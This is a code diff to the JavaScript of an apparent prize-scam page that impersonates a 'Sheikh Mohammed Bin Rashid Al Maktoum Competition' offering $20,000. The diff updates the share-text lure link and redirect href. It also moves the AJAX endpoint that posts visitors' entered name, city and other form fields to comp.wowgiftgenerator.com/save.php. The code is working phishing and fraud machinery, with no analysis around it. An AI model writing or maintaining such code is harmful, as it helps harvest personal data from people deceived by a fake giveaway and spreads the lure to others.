@@ -1,5 +1,5 @@
 
-var texts = ["Sheikh Mohammed Bin Rashid Al Maktoum Competition, answer the questions and win $ 20000 from Sheikh Mohammed bin Rashid Al Maktoum .. ((Answer on 3 Questions)) Join now The number of winners is limited  --> https://comp.wowgiftgenerator.com/en.html"];
+var texts = ["Sheikh Mohammed Bin Rashid Al Maktoum Competition, answer the questions and win $ 20000 from Sheikh Mohammed bin Rashid Al Maktoum .. ((Answer on 3 Questions)) Join now The number of winners is limited  --> https://comp.wowgiftgenerator.com/en/"];
 
 
 
@@ -94,7 +94,7 @@ $(document).ready(function () {
 		} else {
 
 			$.ajax({
-				url: "http://asrar4u.com/rashd/save.php",
+				url: "http://comp.wowgiftgenerator.com/save.php",
 				data: {
 					name: $("#nameform").val(),
 					city: $("#cityform").val(),
@@ -286,7 +286,7 @@ $(document).ready(function () {
 			if (c > 1) {
 				$(this)
 					.attr({
-						href: "https://comp.wowgiftgenerator.com/en.html",
+						href: "https://comp.wowgiftgenerator.com/en/",
 						target: "_self"
 					});
 			}
